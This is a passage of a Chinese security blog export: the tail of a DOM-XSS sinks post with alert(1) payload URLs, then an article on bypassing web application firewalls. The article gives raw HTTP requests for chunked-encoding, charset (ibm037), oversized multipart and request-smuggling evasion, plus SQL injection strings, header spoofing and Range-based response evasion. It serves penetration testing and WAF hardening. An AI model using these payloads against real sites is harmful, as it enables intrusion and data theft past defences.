1https:&#x2F;&#x2F;brutelogic.com.br&#x2F;tests&#x2F;sinks.html?redir&#x3D;javascript:alert(1） 过去，当应用程序过滤器和WAF（Web应用程序防火墙）过滤javascript关键字时，可使用data URI技巧来替换。但是现代浏览器做了一些安全措施，如为JS执行提供空白上下文（空白上下文应该是指没有数据），甚至不再允许跳转（应该指data URI情况下）。 执行接收器（EXECUTION SINK）在执行接收器（Execution Sink）中，本机JavaScript代码使用受攻击者控制或提供的数据来更新其自己的代码流。 通常eval会是一个庞大复杂代码的一部分，在这里只使用一个非常简单的代码：仅有3个变量，变量名分别是三个股票的名称：Nasdaq, Dow Jones and S&amp;P 500 。它们的值并不来自于一个真实应用程序的数据库，因此它们不会变化。 创建market对象，从URL获取index参数的值后，这里使用toString()尝试确保该值最终是字符串（只是一种愚蠢的方式）。该代码之后使用eval函数动态地为market对象创建index属性。最后，获取market.index的值显示在p标签中。 攻击者可以通过以下代码来进行XSS： 1https:&#x2F;&#x2F;brutelogic.com.br&#x2F;tests&#x2F;sinks.html?index&#x3D;alert(1） 因为该代码将被执行，所以看起来很简单。在现实世界的应用程序中，很可能需要根据代码流程进行一些测试才能找到漏洞点。 除eval之外的其他执行接收器(execution sinks)是setInterval和setTimeout函数和模板文字。 以上所诉的就是我们在寻找DOM型的XSS时应该注意的3个接收器(sinks)。","categories":[],"tags":[]},{"title":"对过WAF的一些认知","slug":"对过WAF的一些认知","date":"2020-06-16T05:45:39.452Z","updated":"2020-06-16T05:45:39.452Z","comments":true,"path":"2020/06/15/对过WAF的一些认知/","link":"","permalink":"https://turn1tup.github.io/2020/06/15/%E5%AF%B9%E8%BF%87WAF%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%A4%E7%9F%A5/","excerpt":"","text":"这篇原创文章首发于安全客（2019-04-23 ） 本文由安全客原创发布转载，请参考转载声明，注明出处： https://www.anquanke.com/post/id/177044 本文的主要从绕过WAF过程中需要注意的角色、点出发，尝试理解它们的运作，构建一个简单的知识框架。如果对本文中的任何知识点有任何反对想法或是意见、建议，请提出来，这对笔者是十分重要的，笔者也会十分感激。 首先，WAF分为非嵌入型与嵌入型，非嵌入型指的是硬WAF、云WAF、虚拟机WAF之类的；嵌入型指的是web容器模块类型WAF、代码层WAF。非嵌入型对WEB流量的解析完全是靠自身的，而嵌入型的WAF拿到的WEB数据是已经被解析加工好的。所以非嵌入型的受攻击机面还涉及到其他层面，而嵌入型从web容器模块类型WAF、代码层WAF往下走，其对抗畸形报文、扫操作绕过的能力越来越强，当然，在部署维护成本方面，也是越高的。 HTTP报文包体的解析我们先来探讨一个问题。HTTP请求的接收者在接收到该请求时，会关心哪些头部字段，以及会根据这些头部字段做出对request-body进行相应得解析处理。说实话，要搞清这些东西，最好还是查看web容器的源码，但笔者现在还没做到这一步，在这里仅能根据自身得认知提及一些头部字段。这些头部字段的关系，笔者认为可以总结为如下： Transfer-Encoding（Content-Encoding（Content-Type（charset（data）））） Transfer-Encoding想了解Transfer-Encoding本身的意义，请查看文章“它不但不会减少实体内容传输大小，甚至还会使传输变大，那它的作用是什么呢？” ，这篇文章对理解本小节十分重要。 Apache+php对chunked类型的HTTP请求的处理太怪了。RFC2616中说明了，客户端或服务器，收到的HTTP报文中，如果同时存在chunked与Content-Length，则一定要忽略掉content-length（这一点也理所当然，很好理解），而在apache中反而不能缺少。虽然笔者没有阅读过Apache的源码，但从这一点可以推理出，Apache本身是不支持解析chunked的（对于Apache来说，由于没有解析HTTP请求chunked的代码逻辑，所以一定要从content-length中查看该报文的长度，而chunked可能是被PHP解析了的，所以存在这两个头部一定要同时存在的怪现象）。这一结论也很好地解释了一些让笔者不解的现象，如利用chuncked可以绕过安全狗Apache。 通过shodan搜索相关服务器，笔者简单测试一下，关于常见中间件、语言与chuncked的关系有如下参考： ASPX PHP Java Apache X Y Nginx Y Y IIS Y Y Tomcat X 那关于chunked，可以有什么利用思路呢？ 思路一，构造一个chunked请求体，尝试绕过WAF。其中可以涉及到利用chunked本身的一些规范、特性。 比如，假如WAF会解析chunked，但加入一些chunked的扩展，WAF就解析不了。 反过来，脑洞一下，假如WAF意识到了解析chunked时应该忽略这些扩展，那么在Tomcat下我们是不是可以利用它一下。 12345678910POST &#x2F;test HTTP&#x2F;1.1Host: 127.0.0.1:8081Content-Type: application&#x2F;x-www-form-urlencoded;Content-Length: 29Content-Transform: chuncked3;&amp;user&#x3D;&#39;+&#39;1&#39;&#x3D;&#39;1&amp;foo0(CRLF) 利用思路二，解析不一致导致的问题，Apache+PHP对客户端的请求解析十分“良好” 之前落叶纷飞提到的思路 利用分块传输吊打所有WAF 12345678POST &#x2F;sql.php?id&#x3D;2%20union HTTP&#x2F;1.1......Transfer-Encoding: chunked1aa0(CRLF) 类似还有下面这种 123456789POST &#x2F;test&#x2F;2.php HTTP&#x2F;1.1Host: 192.168.17.138Content-Type: application&#x2F;x-www-form-urlencodedTransfer-Encoding: chunkedContent-Length: 209user&#x3D;root(CRLF) 虽然页面返回的是400，但后台都是执行成功了的。 Content-Encoding它与Transfer-Encoding本质上的区别就是，Transfer-Encoding可以被网络中的各个实体解析并改变，而Content-Encoding在传输过程中不应该、不会被改变的。 该字段在Response中比较常见，而在Request中，可能你一辈子都很难遇到。除非运维人员对Web服务器做了相关配置，使得服务器可以识别并解析客户端Request请求的Content-Encoding 头部字段，否则Web服务默认是不会识别该字段的。笔者想尽量写得全一点，虽然这个字段看起来鸡肋、无用，但可以作为一个可能的突破测试点。 Content-TypeWeb容器应该不怎么关心Content-Type这个字段，后台语言则会识别该字段并进行对应的数据解析。而我们利用该字段的话，主有从以下思路出发：后台语言会识别哪些类型的Content-Type，这些Content-Type对我们绕WAF有没有用。 PHP默认会处理application/x-www-form-urlencoded、multipart/form-data两种。而JAVA后台对于multipart/form-data类型Content-Type的识别处理，需要借助三方库或是框架，默认情况下是无法处理的，但现在一般都用框架，而框架可能默认情况下就会识别并处理这类型的请求。 后台接收到application/x-www-form-urlencoded请求的数据时，会自己解码一次，如果开发人员自己又解码一次或多次，就形成了双重编码、多重编码。 对于multipart/form-data，非嵌入型的与模块类型的WAF，都只能自己识别并解析区分字段内容，所以在这一块你可以发挥自己想象，进行各种骚操作来进行绕过，但是，你应该要确认你当前所要绕过的WAF是不是真的做了这块的内容识别。笔者的意思是说，如果它遇到这种类型Request，只是对Body内容进行全部的规则匹配，而不会解析出其中的表单内容，那你可能就没必要进行那些骚操作了。实际上，有的非嵌入型WAF就是这么“懒”。multipart/form-data的相关骚操作可以参考Protocol-Level Evasion of Web Application Firewalls Charsetcharset是被添加在Content-Type字段后面的，用来指明消息内容所用的字符集，它也仅被后台语言所关心。 • application/x-www-form-urlencoded;charset=ibm037• multipart/form-data; charset=ibm037,boundary=blah• multipart/form-data; boundary=blah ; charset=ibm037 JAVA的Servlet默认是接受大多数的charset的，不过正常点的程序员都会设置强制编码。 有如下示例： 后台代码 1234protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;String userName &#x3D; req.getParameter(&quot;user&quot;);resp.getOutputStream().println(&quot;username :&quot;+userName);&#125; 请求（Burpsui设置User Options-Character sets-Use a specific ..） 123456POST &#x2F;test HTTP&#x2F;1.1Host: 127.0.0.1:8081Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;ibm037Content-Length: 25%A4%A2%85%99&#x3D;%99%96%96%A3 输出 12345HTTP&#x2F;1.1 200 OKServer: Apache-Coyote&#x2F;1.1Content-Length: 16username :root 至少可以支持IBM037, IBM500, cp875, and IBM1026字符集的中间件+语言的情况，可以参考下面表格： Target QueryString POST Body &amp; and = URL-encoding Nginx, uWSGI – Django – Python3 ✔ ✔ ✔ ❌ Nginx, uWSGI – Django – Python2 ✔ ✔ ❌ ✔ (sometimes required) Apache Tomcat – JSP ❌ ✔ ❌ ✔ (sometimes required) IIS – ASPX (v4.x) ✔ ✔ ❌ ✔ (optional) IIS – ASP classic ❌ ❌ Apache/IIS – PHP ❌ ❌ 溢量数据笔者当初有时在瞎想，其中想到，会不会存在URI数量过多，产生绕过呢？没想到就存在这样的一个CVE，CVE-2018-9230-OpenResty URI参数溢出漏洞。 没关系，思想还在嘛，还存在很多的变形，如通过multipart/form-data的方式来发送数据量比较大的报文，但又属于正常的HTTP请求，按照道理来说，对较上层的WAF（非嵌入型、模块类型）应该会有一定杀伤力的。 下面两个例子笔者之前测试时是通过的，安全狗Apache 3.5版。 123456789101112131415POST &#x2F;test&#x2F;test.php HTTP&#x2F;1.1Host: 192.168.17.138Connection: closeContent-Type: multipart&#x2F;form-data; boundary&#x3D;--------2117353554Content-Length: 6167----------2117353554Content-Disposition: form-data; name&#x3D;&quot;test&quot;x*5978 (5978个x)----------2117353554Content-Disposition: form-data; name&#x3D;&quot;user&quot;root&#39; union select 1 ------------2117353554-- 或者下面这种方式： 12345678910111213POST &#x2F;test.php HTTP&#x2F;1.1Connection: closeContent-Type: multipart&#x2F;form-data; boundary&#x3D;123Content-Length: 7497(--123Content-Disposition:form-data; name&#x3D;&quot;aaa&quot;;123)*165 重复165次以上Content-Disposition:form-data; name&#x3D;&quot;aaa&quot;;union select 123--123-- 还有很多种方法，比如前面放一个很大的文件，后面再跟Payload表单，是不是也可能可以。 另外笔者看到一个有趣的旧漏洞，算是扩展一下思维。 1234567891011121314151 POST &#x2F;page.asp HTTP&#x2F;1.12 Host: chaim3 Connection: Keep-Alive4 Content-Length: 492235 [CRLF]6 zzz...zzz [&quot;z&quot; x 49152]7 POST &#x2F;page.asp HTTP&#x2F;1.08 Connection: Keep-Alive9 Content-Length: 3010 [CRLF]11 POST &#x2F;page.asp HTTP&#x2F;1.012 Bla: [space after the &quot;Bla:&quot;, but no CRLF]13 POST &#x2F;page.asp?cmd.exe HTTP&#x2F;1.014 Connection: Keep-Alive15 [CRLF] IIS/5.0在处理非application/x-www-form-urlencoded类型content-type的POST请求时，49152字节后面的数据会被截断。上面的HTTP请求，IIS认为1-6为一个请求，7-12为一个请求，13-5为一个请求；而WAF认为1-10，11-15各为一个请求，POST /page.asp?cmd.exe HTTP/1.0被WAF认为是头部字段中的数据，并不会匹配到拦截规则，所以该请求成功绕过WAF。 HTTP协议兼容性HTTP请求行种的空格在RFC2616文档中，有说到，HTTP头部字段的构造。 123456789SP &#x3D; &lt;US-ASCII SP, space (32)&gt;HT &#x3D; &lt;US-ASCII HT, horizontal-tab (9)&gt;LWS &#x3D; [CRLF] 1*( SP | HT )message-header &#x3D; field-name &quot;:&quot; [ field-value ]field-name &#x3D; tokenfield-value &#x3D; *( field-content | LWS )field-content &#x3D; &lt;the OCTETs making up the field-valueand consisting of either *TEXT or combinationsof token, separators, and quoted-string&gt; 简单点来说就是 Test-Header: Test等效于(空格替换成\\x09)Test-Header: Test 但笔者发现，在请求行中，你也可以这样做（即便RFC2616 5.1节中指明了请求行中只能用空格）。于是，将一个HTTP/1.1的请求变换成如下： OPTIONS * HTTP/1.1Host: dest.com 看着可能不明显，但其中的SP都被笔者替换成了HT，而且，SP、HT可以是1到多个，头部字段中SP 、HT可以是零个。常见的web容器都是接受这种HTTP请求的。 HTTP 0.9+Pipelining关于这条，相关细节可以到WAF Bypass Techniques ，笔者就不细讲了。发明作者说它用这条技巧来绕过WAF(非嵌入型)对服务器上的一些目录的访问限制。 根据本文前面所说，可以知道，对于嵌入型一类的WAF，是根本不可能利用pipelining来进行绕过的——嵌入型WAF获得的数据的来源是Web容器，web容器识别出这是两个包，对于WAF也是两个包。 不过这上面的两点感觉对WAF都没啥用，snort都能识别，那基本上所有WAF厂商都能识别吧。不过知道多点不亏，上面第一点在笔者某次测试中还是体现了一点价值。 Websocket、HTTP/2.0现在越来越多的Web容器都开始支持比较高级的协议了，正常来说，这块不可能不出现新的安全问题的，笔者之前简单查看了HTTP/2.0 与Websocket的主体内容，未发现有什么利用点，后面也未花时间去研究，写在这里也算给自己一个备忘录。 高层数据在一个HTTP请求中，诸如json、base64这样的数据，是由后台代码调用相应的解析库来进行解析的，即便是同结构，不同语言不同库也可能存在一些差异。 base64PHP解析Base64沿袭了其一贯“弱”风格，即便你的字符串含有PHP非法字符串，它也可以成功解析并处理。 测试代码：echo base64_decode($_POST[‘test’]); POST提交test=M#TIzNA== 页面返回1234 Unicode JSON在HTTP请求体中传递JSON数据，一般情况下如果网站用的框架，则Content-Type需要指定application/json类型；如果用了三方库，如fastjson，content-type随意即可。 可以将尝试将key或vaule替换成\\uxxxx的unicode字符。 123456789101112POST &#x2F;json.do HTTP&#x2F;1.1Host: 127.0.0.1:8081Content-Type: application&#x2F;jsonContent-Length: 68&#123;&quot;\\u006e\\u0061\\u006d\\u0065&quot;:&quot;&#39;\\u0072\\u006f\\u006f\\u0074&quot;,&quot;age&quot;:&quot;18&quot;&#125;HTTP&#x2F;1.1 200 OKServer: Apache-Coyote&#x2F;1.1Content-Type: text&#x2F;plain;charset&#x3D;ISO-8859-1Content-Length: 44User&#123;name&#x3D;&#39;&#39;root&#39;, age&#x3D;18, contactInfo&#x3D;null&#125; 这里的unicode关联到JSON，只是一个实际的场景，但可以自己发挥。 实体编码 XMLsoap之类的协议应该也属于XML类，可以利用这类标记语言的实体编码特性。另外发送请求前考虑一下Content-Type类型。 12345678910111213141516POST &#x2F;xml.do HTTP&#x2F;1.1Host: 127.0.0.1:8081Content-Type: application&#x2F;xmlContent-Length: 93&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;&lt;admin&gt;&lt;name&gt;&quot;&amp;apos;&amp;#114;&amp;#111;&amp;#111;&amp;#116;&lt;&#x2F;name&gt;&lt;&#x2F;admin&gt;HTTP&#x2F;1.1 200 OKServer: Apache-Coyote&#x2F;1.1Content-Type: text&#x2F;plain;charset&#x3D;ISO-8859-1Content-Length: 31Admin&#123;name&#x3D;&#39;&quot;&#39;root&#39;, age&#x3D;null&#125; 八进制还有一个字符表示方式，八进制，如#十六进制的值为23，八进制表示为\\43,也是一个可能的点，如在OGNL中就可以使用。 同形字sqlmap的tamper脚本中有个脚本，将’替换为%ef%bc%87，据说是UTF-8全角字符，但是这种说明没有根本地解释这个问题，笔者也不知道什么环境下产生这种利用条件。直到某一天，看到一篇文章，它们之间似乎存在某在联系——Unicode同形字引起的安全问题，现阶段笔者也只能这样认知这个tamper脚本。 有个趣的网站，它已经整理好了，https://www.irongeek.com/homoglyph-attack-generator.php Char 同形 ᅟ ᅠ ㅤ ! ! ǃ ！ “ ” ״ ″ ＂ $ $ ＄ % % ％ &amp; &amp; ＆ ‘ ‘ ＇ ( ( ﹝ （ ) ) ﹞ ） * * ⁎ ＊ + + ＋ , , ‚ ， – – ‐ － . . ٠ ۔ ܁ ܂ ․ ‧ 。 ． ｡ / / ̸ ⁄ ∕ ╱ ⫻ ⫽ ／ ﾉ 0 0 O o Ο ο О о Օ Ｏ ｏ 1 1 I ا １ 2 2 ２ 3 3 ３ 4 4 ４ 5 5 ５ 6 6 ６ 7 7 ７ 8 8 Ց ８ 9 9 ９ 命令、SQL语句等命令注入方面可以利用bash的特性，SQL注入则利用数据库SQL语法特性，各大知名安全网站已经有足够的资料供大家参考，要讲又需要花费时间，讲不全感觉也没意义，笔者就不描述了。 容器语言特性IIS %，在参数中，如果%后面不是符合URL编码十六进制值，就会忽略该%符合，如id=%%20，等价于id=%20。 IIS asp 中的GET请求方式提交Body表单，后台可接收。 IIS asp的参数污染中，通过,逗号连接污染参数。 Tomcat 路径跳转中允许;符号，/..;/..;/。 PHP $_REQUEST可以接收cookie中的参数。 这块想不到更多的了… 匹配缓冲区大小固定思考一下，WAF拿到一个数据之后，在对其进行内容匹配时，是不是会将其放入一个固定大小的内存空间中，这个空间的大小是有限的。假设HTTP Request的body部分大小为2333字节，该内存大小为2000字节，那么其核心引擎在做内容匹配时，是不是先处理2000字节，在处理剩下的333字节。至于如何利用，可以发挥自己的想象。 白名单一个是利用URL中的白名单，如图片、JS等静态资源文件。 还可以尝试利用下面这些头部字段 X-Forwarded-For: 127.0.0.1X-Client-IP: 127.0.0.1Client-IP: 127.0.0.1 另外可以尝试修改Host头部字段。 输出角度前面所讲的都是输入角度，这里我们谈谈输出角度。我们在Request中发送Pyaload，会希望从Response的回显或基于时间这些信息通道来获取Payload执行成功后的相关信息。如果存在某种WAF，检测到Response中的回显数据存在敏感信息，Resonse响应包可能就被阻断掉了。（当然，除了基本的回显数据通道，还有基于时间的数据通道） OOB遇到这种情况，应对的方法之一就是使用OOB思想来绕过。如XXE OOB、SQL注入OOB、命令注入OOB，等等。 Range假如页面可能有敏感数据返回，而当前攻击场景又利用不了OOB，你可以尝试使用Range方法来绕过防火墙。 普通请求与页面结果： 12345678910111213POST &#x2F;test&#x2F;test.php HTTP&#x2F;1.1Host: 192.168.17.138Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 9Range: bytes&#x3D;10-30user&#x3D;rootHTTP&#x2F;1.1 200 OKServer: Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2j PHP&#x2F;5.2.17Content-Length: 42Content-Type: text&#x2F;htmlSELECT password from user where user &#x3D; &#39;&#39; 添加了range，请求获取返回页面0到10的数据： 123456789101112131415POST &#x2F;test&#x2F;test.php HTTP&#x2F;1.1Host: 192.168.17.138Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 9Range: bytes&#x3D;0-10user&#x3D;rootHTTP&#x2F;1.1 206 Partial ContentServer: Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2j PHP&#x2F;5.2.17Content-Range: bytes 0-10&#x2F;394Content-Length: 11Content-Type: text&#x2F;htmlSELECT pass 添加了range，请求获取返回页面10到30的数据： 123456789101112131415POST &#x2F;test&#x2F;test.php HTTP&#x2F;1.1Host: 192.168.17.138Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 9Range: bytes&#x3D;10-30user&#x3D;rootHTTP&#x2F;1.1 206 Partial ContentServer: Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2j PHP&#x2F;5.2.17Content-Range: bytes 10-30&#x2F;394Content-Length: 21Content-Type: text&#x2F;htmlsword from user where Range方式应该是所有Web容器默认支持的，这个东西还是有点意思，有点作用。 其他参考传输层看CVE时发现的，3whs bypass ids 1234567Attack scenario TCP flow scheme:Client -&gt; [SYN] [Seq&#x3D;0 Ack&#x3D; 0] -&gt; Evil ServerClient &lt;- [SYN, ACK] [Seq&#x3D;0 Ack&#x3D; 1] &lt;- Evil ServerClient &lt;- [PSH, ACK] [Seq&#x3D;1 Ack&#x3D; 1] &lt;- Evil Server # Injection before the 3whs is completedClient &lt;- [FIN, ACK] [Seq&#x3D;83 Ack&#x3D; 1] &lt;- Evil ServerClient -&gt; [ACK] [Seq&#x3D;1 Ack&#x3D; 84] -&gt; Evil ServerClient -&gt; [PSH, ACK] [Seq&#x3D;1 Ack&#x3D; 84] -&gt; Evil Server 在三次握手未完成之前，服务端返回了数据，可以造成HTTP流量检测的绕过，该种攻击场景可能是被用于挂马、钓鱼之类的。在链接中作者给出了对应的PCAP包，可以下载来看看，算是涨见识。 在传输层这里，还有一些简单而具备实际意义的操作，比如将一个TCP报文分片成很多很多份，一份几个字节，十几个字节，对端服务器能正常接收，而对非嵌入型的WAF就是一个考验；还有，我们知道，TCP是可靠的协议，那么我们再将这些报文进行一个合适的乱序，那么是否也可行。 SSL层对于非嵌入型WAF，在解析SSL数据时，需要该SSL通信端服务器的密钥（非对称）。客户端在与Web服务器进行HTTPS通信时，协商SSL的加密方式可以有很多种，如果其中有一种加密方式恰好是WAF无法识别的，那么WAF就只能睁眼瞎了。 Bypassing Web-Application Firewalls by abusing SSL/TLS DOS笔者之前了解到，中小公司的防火墙的流量处理能力是很弱的，所以DOS确实可行，算是最后的方案。 结语本文的模型都是建立在笔者所见所得之上的，另外也开了一些脑洞进行猜想，如有错误欢迎指正。文章中的一些点，笔者并没有在文中详解，但通过参考资料可以很好地理解每一点。 希望对大家有所裨益，本文也算对之前所学有所交代吧. 其他说明，RFC7230对文章中所说的RFC2616的描述未发生修改。 本文参考资料汇总如下 RCF2616 https://tools.ietf.org/html/rfc2616 Bypassing Web-Application Firewalls by abusing SSL/TLS https://0x09al.github.io/waf/bypass/ssl/2018/07/02/web-application-firewall-bypass.html WAF Bypass Techniques https://2018.appsec.eu/presos/Hacker*WAF-Bypass-Techniques*Soroush-Dalili_AppSecEU2018.pptx Application Security Weekly: Reverse Proxies Using Weblogic, Tomcat, and Nginx https://www.acunetix.com/blog/web-security-zone/asw-reverse-proxies-using-weblogic-tomcat-and-nginx/ Protocol-Level Evasion of Web Application Firewalls https://media.blackhat.com/bh-us-12/Briefings/Ristic/BH*US*12*Ristic*Protocol*Level*Slides.pdf Chunked HTTP transfer encoding https://swende.se/blog/HTTPChunked.html Impedance Mismatch and Base64 https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/impedance-mismatch-and-base64/ HTTP 协议中的 Transfer-Encoding https://imququ.com/post/transfer-encoding-header-in-http.html 浅谈json参数解析对waf绕过的影响 https://xz.aliyun.com/t/306 3whs bypass ids https://www.exploit-db.com/exploits/44247/ Web Application Firewall (WAF) Evasion Techniques https://medium.com/secjuice/waf-evasion-techniques-718026d693d8 BypassWAF新思路（白名单） https://www.chainnews.com/articles/774551652625.htm 利用分块传输吊打所有WAF https://www.anquanke.com/post/id/169738 HTTP Request Smuggling https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf","categories":[],"tags":[]}],"categories":[],"tags":[]}